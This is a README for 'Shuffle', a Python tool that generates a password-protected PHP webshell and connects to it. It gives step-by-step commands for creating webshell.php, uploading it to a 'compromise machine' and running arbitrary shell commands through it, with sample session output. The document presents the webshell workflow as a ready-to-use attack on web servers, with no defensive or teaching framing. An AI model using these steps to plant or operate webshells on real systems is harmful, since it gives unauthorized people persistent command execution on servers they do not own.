![Shuffle Logo](https://raw.githubusercontent.com/matiasmenares/shuffle/master/extras/logo.png)

[![Code Climate](https://codeclimate.com/github/matiasmenares/Shuffle/badges/gpa.svg)](https://codeclimate.com/github/matiasmenares/Shuffle)

### Version
0.2 (Beta)
### Installation

Only you need is Python 2.7

Clone repository
```sh
$ git clone https://github.com/matiasmenares/Shuffle
```
## Getting started
Shuffle 0.1 (Beta) works with Python 2.7 You can run it with:

```sh
$ python shuffle.py -h
```
Command:
  - -g Generate shell
  - -p Setting Password
  - -u Url to connect
  
To create a webshell run:
```sh
$ python shuffle.py -g webshell.php -p h4x0r
```
And Webshell generate in shuffle folder.
```sh
~/shuffle/out/webshell.php
```
### Connecting
When you upload shell to compromise machine only you need is run shell with:

```sh
$ python shuffle.py -u http://localhost/webshell.php -p h4x0r
```

And wait to establish connection...

```sh
#> Conecction Established, Enjoy!

localhost@apache[~]$>
```

Now you can run all command !

```sh
#> Conecction Established, Enjoy!

localhost@apache[~]$> ls
app
lib
index.php
localhost@apache[~]$> 

```
to close the conection type exit.

```sh
localhost@apache[~]$> exit
#> Connection Closet by user.
$ 
```
## Extras
### Banner
if you want change login banner modify this file:
```sh
~/shuffle/extras/banner.txt
```
### How to Contributing?

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

Done!

License
----

GNU

**Free Software, Hell Yeah!**
